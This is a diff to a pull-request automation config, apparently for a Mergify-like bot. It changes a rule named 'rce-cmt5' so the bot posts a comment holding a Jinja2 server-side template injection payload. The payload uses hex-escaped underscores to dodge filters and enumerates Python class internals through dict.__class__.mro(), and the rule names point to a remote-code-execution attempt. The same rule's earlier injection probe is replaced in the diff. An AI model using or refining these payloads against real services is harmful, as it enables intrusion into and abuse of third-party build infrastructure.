@@ -1,7 +1,7 @@
 pull_request_rules:
-  - name: rce-cmt4
+  - name: rce-cmt5
     conditions:
       - base=master
     actions:
       comment:
-        message: "CVE: {{ ''|attr('format')('{0.__class__}') }}"
+        message: "{% for k in dict['\x5f\x5fclass\x5f\x5f'].mro()[0]['\x5f\x5fdict\x5f\x5f'] %}{{ k|replace('_','-') }}|{% endfor %}"
